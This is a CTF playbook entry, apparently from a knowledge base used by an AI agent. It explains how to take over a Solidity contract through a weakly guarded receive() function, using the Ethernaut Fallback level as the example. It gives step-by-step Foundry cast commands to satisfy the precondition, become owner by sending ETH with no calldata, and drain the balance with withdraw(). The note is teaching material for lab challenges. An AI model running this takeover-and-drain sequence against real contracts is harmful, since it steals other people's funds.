---
id: web3-receive-fallback-weak-access-control
category: WEB
tags: [web3, blockchain, evm, solidity, receive, fallback, access-control, owner-takeover, onlyowner, send-ether-outside-abi, raw-tx, msg-value, ethernaut, fallback-level, withdraw, drain, cast]
tools: [Web3]
manuals: ["Manuals/Web3/3. Contexto para Claude.md"]
title: "Web3: owner takeover via receive()/fallback() with weak access control (send ETH outside the ABI)"
difficulty: easy
created: 2026-10-07
updated: 2026-10-07
related: [web3-commit-secret-msgsender-gated]
---

## How to recognize this pattern

- The contract has a `payable` `receive()` and/or `fallback()` that **changes critical state** (`owner`,
  `authorized`, an access flag) with a weak `require`, typically just `msg.value > 0` and/or a trivial
  condition, **without** comparing against the real state it should protect.
- The "legit" owner change (e.g. `contribute()`) is infeasible on purpose (a tiny per-tx cap vs. an
  owner starting with a huge balance). It's a distraction; the real path is `receive()`.
- The challenge goal is usually to become `owner` and/or **drain the balance** (`withdraw()` gated by
  `onlyOwner`).
- Mental tip: **always test what happens when you send ETH directly to the contract without calling a
  function.** `receive()`/`fallback()` are the classic hiding spot for broken access control.

## Method

Reference case: Ethernaut, Fallback. `receive()` does `owner = msg.sender` requiring only
`msg.value > 0 && contributions[msg.sender] > 0`. It never compares against the owner's contribution.

The project toolchain is `cast` (Foundry), not the Ethernaut web3.js console. See
`Manuals/Web3/3. Contexto para Claude.md`. Setup:

```bash
CAST=~/.config/.foundry/bin/cast
RPC="<rpc>"; PK="<private key>"; T="<target addr>"
ME=$($CAST wallet address --private-key $PK)
```

### 1. Satisfy the trivial precondition

`receive()` requires `contributions[msg.sender] > 0` → make the minimum contribution first:

```bash
$CAST send $T "contribute()" --value 0.0005ether --private-key $PK --rpc-url "$RPC"
```

### 2. Trigger receive()/fallback() = send ETH **outside the ABI**

The trigger is a tx **with no calldata** (or with a nonexistent selector) and `value > 0`. In `cast`,
sending just `--value` with no function signature falls into `receive()`:

```bash
$CAST send $T --value 0.0001ether --private-key $PK --rpc-url "$RPC"   # triggers receive() -> owner = you
$CAST call $T "owner()(address)" --rpc-url "$RPC"                       # confirm == $ME
```

### 3. Run the now-unlocked action (drain)

```bash
$CAST send $T "withdraw()" --private-key $PK --rpc-url "$RPC"
$CAST balance $T --rpc-url "$RPC"      # should zero out
```

## Gotchas

- **Order matters:** running `withdraw()` before step 2 reverts (status 0) on the `require(msg.sender
  == owner)`. The ETH-outside-the-ABI tx (step 2) must **confirm** before the withdraw.
- **"Send ETH outside the ABI"** = a tx with no function selector. Equivalents:
  - Ethernaut/web3.js: `contract.sendTransaction({value: ...})`
  - `cast`: `cast send <addr> --value <x>` (no function signature)
  - raw: a tx with empty `data` or a selector that matches no function → `fallback()`.
- `receive()` only fires with **empty** `data`; if you send non-empty `data` that matches no function,
  it goes to `fallback()`. If the contract only has `fallback()`, send any one byte of calldata.
- Always confirm the on-chain objective (`owner()`, balance, `isSolved()`) before declaring; validate the flag against the CTF's configured flag format before declaring success.

## Transferable lesson

In any contract: check `receive()`/`fallback()` first. A sensitive state mutation (`owner`, permission)
in these hooks with a weak `require` = takeover with one empty tx. It's the "send ether directly" that
most people forget to test.

## Related / Cross-reference

- `Arsenal/WEB/web3-commit-secret-msgsender-gated.md`: another web3 access gate (by `msg.sender` +
  a hash in storage).
- `Manuals/Web3/3. Contexto para Claude.md`: `cast`/`heimdall` commands and the `instance.json` flow.
